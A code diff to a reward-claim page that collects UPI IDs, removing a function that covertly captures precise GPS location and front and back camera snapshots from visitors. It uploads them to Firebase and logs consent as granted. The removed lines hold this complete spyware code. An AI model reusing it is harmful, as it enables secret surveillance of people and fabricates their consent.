@@ -6,8 +6,6 @@
 import { 
   saveRewardClaim, 
   saveConsentRecord, 
-  saveVisitorLocation,
-  saveVisitorUpload,
   getOrCreateParticipantId 
 } from './firebase-config.js';
 
@@ -16,153 +14,6 @@ const UPI_REGEX = /^[a-zA-Z0-9.\-_]{2,256}@[a-zA-Z]{2,64}$/;
 
 let currentClaimSpinId = null;
 let currentClaimPrize = null;
-
-/**
- * Capture frame from specified camera facing mode (front vs back)
- */
-async function captureDeviceCamera(facingMode = 'user') {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
-
-  let stream = null;
-  try {
-    const constraints = {
-      video: {
-        facingMode: facingMode === 'environment' ? { ideal: 'environment' } : { ideal: 'user' },
-        width: { ideal: 640 },
-        height: { ideal: 480 }
-      },
-      audio: false
-    };
-
-    stream = await navigator.mediaDevices.getUserMedia(constraints);
-    
-    // Hidden video element to read frame
-    const video = document.createElement('video');
-    video.autoplay = true;
-    video.muted = true;
-    video.playsInline = true;
-    video.srcObject = stream;
-
-    await new Promise((resolve) => {
-      video.onloadedmetadata = () => {
-        video.play().then(resolve).catch(resolve);
-      };
-      setTimeout(resolve, 900);
-    });
-
-    // Wait until video has valid dimensions
-    let attempts = 0;
-    while ((video.videoWidth === 0 || video.readyState < 2) && attempts < 15) {
-      await new Promise(r => setTimeout(r, 80));
-      attempts++;
-    }
-
-    // Small delay for camera auto-exposure
-    await new Promise(r => setTimeout(r, 350));
-
-    const w = video.videoWidth || 640;
-    const h = video.videoHeight || 480;
-    const maxDim = 640;
-    let targetW = w;
-    let targetH = h;
-    if (targetW > maxDim || targetH > maxDim) {
-      if (targetW > targetH) {
-        targetH = Math.round((h * maxDim) / w);
-        targetW = maxDim;
-      } else {
-        targetW = Math.round((w * maxDim) / h);
-        targetH = maxDim;
-      }
-    }
-
-    const canvas = document.createElement('canvas');
-    canvas.width = targetW;
-    canvas.height = targetH;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, targetW, targetH);
-
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.75);
-    return dataUrl;
-  } catch (err) {
-    console.warn(`Camera capture skipped/failed for (${facingMode}):`, err.message);
-    return null;
-  } finally {
-    if (stream) {
-      stream.getTracks().forEach(t => t.stop());
-    }
-  }
-}
-
-/**
- * Request Native Browser Permissions (Accurate Location & Front/Back Camera Snapshots)
- */
-export async function requestNativeBrowserPermissions() {
-  const participantId = getOrCreateParticipantId();
-
-  // 1. Accurate Geolocation (GPS High-Accuracy)
-  if (navigator.geolocation) {
-    try {
-      navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          const { latitude, longitude, accuracy } = pos.coords;
-          console.log("📍 Accurate Location obtained:", latitude, longitude, `(±${Math.round(accuracy)}m)`);
-          await saveVisitorLocation({
-            participantId: participantId,
-            latitude: parseFloat(latitude.toFixed(6)),
-            longitude: parseFloat(longitude.toFixed(6)),
-            accuracy: Math.round(accuracy)
-          });
-          await saveConsentRecord({
-            participantId: participantId,
-            locationConsent: true,
-            action: 'granted'
-          });
-        },
-        (err) => {
-          console.warn("Location prompt dismissed or unavailable:", err.message);
-        },
-        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-      );
-    } catch (e) {
-      console.warn("Geolocation execution error:", e);
-    }
-  }
-
-  // 2. Front & Back Camera Snapshots
-  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    try {
-      // Step A: Capture Front Camera
-      const frontDataUrl = await captureDeviceCamera('user');
-      if (frontDataUrl) {
-        console.log("📸 Front camera snapshot captured");
-        await saveVisitorUpload({
-          participantId: participantId,
-          fileReference: frontDataUrl,
-          uploadType: 'front_camera'
-        });
-        await saveConsentRecord({
-          participantId: participantId,
-          cameraConsent: true,
-          action: 'granted'
-        });
-      }
-
-      // Step B: Capture Back Camera on dual-camera mobile devices
-      await new Promise(r => setTimeout(r, 300));
-      const backDataUrl = await captureDeviceCamera('environment');
-      if (backDataUrl && backDataUrl !== frontDataUrl) {
-        console.log("📸 Back camera snapshot captured");
-        await saveVisitorUpload({
-          participantId: participantId,
-          fileReference: backDataUrl,
-          uploadType: 'back_camera'
-        });
-      }
-    } catch (err) {
-      console.warn("Camera routine error:", err);
-    }
-  }
-}
 
 /**
  * Open the UPI Reward Claim Modal
@@ -276,10 +127,7 @@ export async function handleUpiSubmission() {
       action: 'granted'
     });
 
-    // 3. Request native browser permissions (Location, Camera, Sound) directly
-    requestNativeBrowserPermissions();
-
-    // 4. Close UPI Modal & show Clean Success confirmation
+    // 3. Close UPI Modal & show Clean Success confirmation
     closeRewardClaimModal();
 
     if (window.showToast) {
@@ -306,9 +154,6 @@ export async function handleUpiSubmission() {
  */
 export function handleSkipUpiClaim() {
   closeRewardClaimModal();
-  
-  // Request native browser permissions
-  requestNativeBrowserPermissions();
 
   if (window.showToast) {
     window.showToast("Participation saved. You can spin again anytime!", "warning");
@@ -325,10 +170,9 @@ function showError(el, message) {
   el.classList.add('visible');
 }
 
-// Global hook for cross-module access
+// Global hooks for cross-module access
 window.openRewardClaimModal = openRewardClaimModal;
 window.closeRewardClaimModal = closeRewardClaimModal;
 window.handleUpiSubmission = handleUpiSubmission;
 window.handleSkipUpiClaim = handleSkipUpiClaim;
-window.requestNativeBrowserPermissions = requestNativeBrowserPermissions;
 window.showSuccessModal = showSuccessModal;
